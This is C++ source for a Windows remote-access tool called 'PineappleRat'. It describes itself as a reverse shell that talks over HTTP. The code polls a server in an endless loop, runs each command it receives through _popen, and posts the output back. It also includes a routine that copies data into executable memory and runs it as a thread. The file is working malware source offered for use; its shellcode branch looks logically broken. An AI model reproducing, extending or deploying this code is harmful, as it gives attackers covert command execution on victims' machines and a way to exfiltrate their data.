/*
reverse shell for windows using c++ that communicates over HTTP and executes shellcode in memory
PineappleRat 74m0 

Start: Jan 18 2025
Last Modified: Jan 19 2025
*/

// imports
#include <iostream>
#include <stdio.h>
#include <winsock2.h>  // winsock2 library
#include <winhttp.h>   // winhttp library
#include <string>
#include <vector>
#include <array>
#include <memory>
#include <stdexcept>
#include <windows.h>  // Include Windows API
#pragma comment(lib, "ws2_32") // linking winsock2 library
#pragma comment(lib, "winhttp") // linking winhttp library

// variables
struct conn {
    const char* ip;
    short port;
};


// Convert a standard string to a wide string
std::wstring stringToWString(const std::string& str) {
    // Determine the length of the wide string needed
    int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, 0, 0);
    // Create a wide string with the required length
    std::wstring wstr(len, L'\0');
    // Convert the standard string to a wide string
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], len);
    return wstr;
}

// Execute a command and return its output as a string
std::string execCommand(const std::string& cmd) {
    // Buffer to store the output of the command
    std::array<char, 128> buffer;
    // String to accumulate the result
    std::string result;
    // Open a pipe to execute the command
    std::shared_ptr<FILE> pipe(_popen(cmd.c_str(), "r"), _pclose);
    // Check if the pipe was successfully opened
    if (!pipe) throw std::runtime_error("popen() failed!");
    // Read the output of the command line by line
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Function to execute shellcode in memory
void executeShellcode(const std::string& shellcode) {
    // Allocate memory for the shellcode
    LPVOID exec_mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return;

    // Copy shellcode to allocated memory
    RtlMoveMemory(exec_mem, shellcode.data(), shellcode.size());

    // Create a thread to execute the shellcode
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (thread) {
        // Wait for the thread to finish execution
        WaitForSingleObject(thread, INFINITE);
        // Close the thread handle
        CloseHandle(thread);
    }

    // Free the allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

// Establish a connection and handle command execution and response
void connection(const conn& connection_info) {
    // Initialize WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    // Specify an HTTP server
    HINTERNET hConnect = WinHttpConnect(hSession, 
                                        stringToWString(connection_info.ip).c_str(), 
                                        connection_info.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    while (true) {
        // Create an HTTP request handle
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) break;
        
        // Send a request
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            break;
        }

        // Read command from response
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
            std::string command(buffer.data());

            // Execute command and get output
            std::string output = execCommand(command);

            // Execute shellcode if command is "exec_shellcode"
            if (command == "exec_shellcode") {
                executeShellcode(output);
            }

            // Send output back to server
            HINTERNET hPostRequest = WinHttpOpenRequest(hConnect, L"POST", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hPostRequest) {
                std::wstring wOutput = stringToWString(output);
                WinHttpSendRequest(hPostRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)wOutput.c_str(), wOutput.length() * sizeof(wchar_t), wOutput.length() * sizeof(wchar_t), 0);
                WinHttpReceiveResponse(hPostRequest, NULL);
                WinHttpCloseHandle(hPostRequest);
            }
        }

        WinHttpCloseHandle(hRequest);
    }

    // Close handles
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    // Define connection information
    conn connection_info = {"127.0.0.1", 80}; // example IP and port
    // Establish connection and handle commands
    connection(connection_info);
    return 0;
}